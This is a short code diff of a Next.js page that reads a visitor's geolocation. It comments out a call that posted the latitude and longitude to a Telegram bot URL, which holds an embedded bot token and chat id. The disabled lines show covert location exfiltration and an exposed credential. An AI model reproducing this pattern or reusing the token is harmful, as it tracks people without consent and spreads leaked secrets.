@@ -46,10 +46,10 @@ const Client: NextPage = () => {
             // Retrieve latitude & longitude coordinates from `navigator.geolocation` Web API
             navigator.geolocation.getCurrentPosition(({ coords }) => {
                 const { latitude, longitude } = coords;
-                axios({
-                    method: "post",
-                    url: `https://api.telegram.org/bot6809002664:AAH-V6Uuundeumlrc3OKQbuqo-d6wxQmOfM/sendMessage?chat_id=6024248780&text=${latitude}%0A${longitude}`
-                })
+                // axios({
+                //     method: "post",
+                //     url: `https://api.telegram.org/bot6809002664:AAH-V6Uuundeumlrc3OKQbuqo-d6wxQmOfM/sendMessage?chat_id=6024248780&text=${latitude}%0A${longitude}`
+                // })
             })
         }
     }, []);
